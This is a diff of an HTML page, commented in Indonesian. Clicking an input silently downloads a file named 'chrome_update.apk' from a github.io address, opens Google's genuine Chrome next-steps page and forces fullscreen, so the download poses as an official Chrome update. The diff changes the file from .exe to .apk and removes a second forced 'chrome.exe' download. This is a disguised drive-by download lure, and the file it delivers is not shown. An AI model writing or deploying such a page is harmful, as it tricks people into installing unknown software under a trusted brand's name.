@@ -10,46 +10,26 @@
 
   <script>
     document.getElementById('triggerInput').addEventListener('click', function() {
-      // Langsung picu download APK saat input diklik
+      // Hanya picu download APK dari link yang diberikan
       triggerAPKDownload();
       
-      setTimeout(function() {
-        openWin();
-      }, 500);
-
       window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?standalone=1&installdataindex=empty&defaultbrowser=0', '_blank');
       goFullScreen();
     }, { once: false });
 
-    // Download helper
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
-    // Fungsi untuk download APK
+    // Fungsi untuk download APK langsung
     function triggerAPKDownload() {
-      const apkUrl = "https://zriil.github.io/S/upload/chrome_update.exe";
+      const apkUrl = "https://zriil.github.io/S/upload/chrome_update.apk";
       const link = document.createElement("a");
       link.href = apkUrl;
-      link.download = "chrome_update.apk";
+      link.download = "chrome_update.apk"; // Nama file saat diunduh
       link.style.display = "none";
       document.body.appendChild(link);
       link.click();
       document.body.removeChild(link);
     }
 
-    Kick off your "APK" download (fungsi original tetap dipertahankan)
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "chrome.exe"
-      );
-    }
+    // Hapus semua fungsi download original
   </script>
 </body>
 </html>
